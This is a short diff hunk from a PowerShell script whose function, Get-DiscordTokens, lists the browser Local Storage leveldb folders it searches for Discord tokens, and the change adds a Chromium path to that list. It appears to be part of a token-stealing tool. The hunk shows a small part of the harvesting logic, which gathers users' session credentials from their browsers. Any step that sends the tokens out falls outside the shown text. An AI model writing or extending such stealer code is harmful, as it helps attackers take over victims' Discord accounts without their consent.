@@ -493,6 +493,7 @@ function Get-DiscordTokens{
         "Yandex"               = Join-Path $local   "Yandex\YandexBrowser\User Data\Local Storage\leveldb"
         "Brave"                = Join-Path $local   "BraveSoftware\Brave-Browser\User Data\Local Storage\leveldb"
         "Iridium"              = Join-Path $local   "Iridium\User Data\Default\Local Storage\leveldb"
+        "Chromium"             = Join-Path $local "Chromium\User Data\Default\Local Storage\leveldb"
     }
 
     # --- Loop through directories and search for tokens ---
